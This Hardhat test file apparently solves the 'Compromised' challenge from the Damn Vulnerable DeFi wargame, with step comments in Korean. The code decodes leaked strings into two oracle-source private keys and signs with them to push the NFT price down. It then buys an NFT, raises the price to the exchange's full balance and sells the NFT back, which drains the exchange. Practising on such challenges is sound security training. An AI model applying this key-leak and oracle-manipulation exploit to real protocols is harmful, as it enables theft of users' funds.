const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }
        // Attacker starts with 0.1 ETH in balance
        // await ethers.provider.send("hardhat_setBalance", [
        //     attacker.address,
        //     //(ethers.utils.parseEther('0.2')).toHexString(), // 0.2 ETH
        //     // "0x02c68af0bb140000",
        //     "0x2c68af0bb140000",
        // ]);
        // expect(
        //     await ethers.provider.getBalance(attacker.address)
        // ).to.equal(ethers.utils.parseEther('0.2'));


        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */

        // 1. hacking된 data -> base64 decoding -> private key 추출
        const leakedData1 = `4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35`;
        const leakedData2 = `4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34`;
        const base64_1 = Buffer.from(leakedData1.split(` `).join(``), `hex`).toString(`utf8`);
        const base64_2 = Buffer.from(leakedData2.split(` `).join(``), `hex`).toString(`utf8`);
        const privKey1 = Buffer.from(base64_1, `base64`).toString(`utf8`);
        const privKey2 = Buffer.from(base64_2, `base64`).toString(`utf8`);
        console.log(`private key1: [${privKey1}]`);
        console.log(`private key2: [${privKey2}]`);

        // 2. 추출된 private key로 signer 생성
        console.log('1111')
        // let source1 = new ethers.Wallet(privKey1, ethers.getDefaultProvider());
        let source1 = (new ethers.Wallet(privKey1)).connect(deployer.provider);
        let source2 = (new ethers.Wallet(privKey2)).connect(deployer.provider);
        console.log('3333')
        // console.log(await ethers.provider.getBalance(source1.address))
        // console.log(await ethers.provider.getBalance(source2.address))
        // 3. 생성된 signer로 postPrice() 수행 -> 가격은 attacker가 보유한 0.1 ETH로
        let tx = await this.oracle.connect(source1).postPrice("DVNFT", ethers.utils.parseEther('0.01'));
        await tx.wait();
        tx = await this.oracle.connect(source2).postPrice("DVNFT", ethers.utils.parseEther('0.01'));
        await tx.wait();

        console.log('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
        // // 4. buyOne 수행 -> attacker가 NFT를 0.1 ETH에 구매
        tx = await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther('0.01') });
        let receipt = await tx.wait();
        console.log(tx)
        console.log(receipt)
        console.log('XXXXXX')
        // // 5. 생성된 signer로 postPrice() 수행 -> 가격은 EXCHANGE_INITIAL_ETH_BALANCE에 해당하는 9990 ETH로
        let totalBalance = await ethers.provider.getBalance(this.exchange.address);
        tx = await this.oracle.connect(source1).postPrice("DVNFT", totalBalance);
        await tx.wait();
        tx = await this.oracle.connect(source2).postPrice("DVNFT", totalBalance);
        await tx.wait();

        // 6. sellOne 수행 -> attacker가 NFT를 9990 ETH에 판매
        await (this.nftToken.connect(attacker)).approve(this.exchange.address, 0);
        tx = await this.exchange.connect(attacker).sellOne(0);
        await tx.wait();

        // 7. 생성된 signer로 postPrice() 수행 -> 가격은 INITIAL_NFT_PRICE 해당하는 999 ETH로
        tx = await this.oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE);
        await tx.wait();
        tx = await this.oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE);
        await tx.wait();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
